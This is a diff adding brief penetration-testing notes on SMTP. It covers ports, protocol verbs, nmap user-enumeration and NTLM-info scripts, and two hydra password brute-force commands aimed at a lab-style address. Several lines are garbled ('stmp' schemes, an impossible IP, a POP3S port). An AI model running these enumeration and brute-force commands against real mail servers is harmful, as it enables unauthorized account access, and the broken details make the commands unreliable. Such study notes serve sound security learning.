@@ -1,0 +1,28 @@
+SMTP
+	standard ports 25,465,587
+openssl s_client -connect <IP>:465
+	
+HELO client.example.com
+DATA
+VRFY unmae
+NOOP
+QUIT
+STARTTLS
+RCPT
+DATA
+RSET
+MAIL
+
+ESMTP
+EHLO
+AUTH
+STARTTLS
+SIZE
+
+nmap --script smtp-enum-users.nse -p 25,465,587 nmap.org
+nmap -p 25,465,587 --script smtp-ntlm-info --script-args smtp-ntlm-info.domain=domain.com 256.1.1.25
+
+smtp-user-enum
+
+hydra -S -P /opt/metasploit-framework/embedded/framework/data/wordlists/unix_users.txt -e n -V stmp-enum://10.11.1.24:995
+hydra -S -l $emailaddr -P /usr/share/wordlists/rockyou.txt -e s -V stmp://10.11.1.24:995
